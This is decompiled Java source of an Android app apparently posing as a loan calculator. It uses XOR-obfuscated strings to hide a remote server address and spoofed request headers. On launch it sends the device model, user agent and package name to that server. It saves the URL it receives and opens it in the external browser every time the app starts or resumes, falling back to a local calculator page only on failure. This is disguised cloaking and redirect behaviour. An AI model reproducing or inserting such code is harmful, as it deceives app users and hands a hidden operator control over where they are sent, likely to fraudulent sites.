package com.luckycalc.loanfinance;

import K.A0;
import K.y0;
import N0.b;
import P0.c;
import Q0.d;
import T.t;
import W0.a;
import X0.e;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.luckycalc.loanfinance.MainActivity;
import com.luckycalc.loanfinance.R;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.p;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: E, reason: collision with root package name */
    public static final /* synthetic */ int f1861E = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1862A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1863B;

    /* renamed from: C, reason: collision with root package name */
    public String f1864C;

    /* renamed from: D, reason: collision with root package name */
    public final c f1865D;

    /* renamed from: y, reason: collision with root package name */
    public final c f1866y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1867z;

    public MainActivity() {
        this.d.f2374b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        this.f1866y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1861E;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1867z = t(new byte[]{-18, -16, 115});
        this.f1862A = t(new byte[]{-1, -29, 102, 41});
        this.f1865D = new c(new b());
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 141, (int) 150, (int) 20, (int) 69};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        return new String(d.x0(arrayList), e1.a.f1910a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1863B = getSharedPreferences(this.f1867z, 0);
        setContentView(v().f617a);
        u();
        WebSettings settings = v().f618b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        v().f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1863B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            e.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1862A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1864C = string;
            x(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-78, -9, 100, 53, -80});
        e.d(getPackageName(), "getPackageName(...)");
        byte[] bArr = {-27, -30, 96, 53, -2, -84, 59, 106, -12, -13, 120, 41, -30, -31, 57, 49, -1, -29, 96, 45, -96, -89, 38, 117, -67, -72, 115, 51, -31, -32, 98, 38, -26, -3, 123, 104, -28, -28, 102, 60, -29, -11, Byte.MAX_VALUE, 46, -20, -81, 39, 107, -6, -7, 102, 46, -24, -28, 103, 107, -23, -13, 98, 106};
        int[] iArr = {(int) 141, (int) 150, (int) 20, (int) 69};
        ArrayList arrayList = new ArrayList(60);
        int i = 0;
        int i2 = 0;
        while (i < 60) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        String str = new String(d.x0(arrayList), e1.a.f1910a) + t2 + packageName;
        t tVar = new t(4);
        e.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f741a = lVar.a();
        String t3 = t(new byte[]{-43, -69, 80, 32, -5, -1, 119, 32, -96, -37, 123, 33, -24, -6});
        String str2 = Build.MODEL;
        e.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{-52, -11, 119, 32, -3, -30, 57, 9, -20, -8, 115, 48, -20, -15, 113}), t(new byte[]{-24, -8, 57, 16, -34, -70, 113, 43, -74, -25, 41, 117, -93, -81}));
        String t4 = t(new byte[]{-40, -27, 113, 55, -96, -41, 115, 32, -29, -30});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        H.e b2 = tVar.b();
        p pVar = (p) this.f1865D.a();
        pVar.getClass();
        j jVar = new j(pVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3227e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3567a;
        jVar.f3228f = n.f3567a.g();
        t tVar2 = pVar.f2475a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f742b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f743c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e.a(((m) gVar.f3221c.f3225b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f742b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e.a(((m) gVar.f3221c.f3225b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3220b = gVar2.f3220b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1864C;
        if (str != null) {
            x(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.m0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.P();
        y0Var.p0();
    }

    public final O0.a v() {
        return (O0.a) this.f1866y.a();
    }

    public final void w() {
        v().f618b.setVisibility(0);
        v().f618b.loadUrl(t(new byte[]{-21, -1, 120, 32, -73, -71, 59, 106, -20, -8, 112, 55, -30, -1, 112, 26, -20, -27, 103, 32, -7, -71, 125, 43, -23, -13, 108, 107, -27, -30, 121, 41}));
    }

    public final void x(String str) {
        v().f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            w();
        }
    }
}
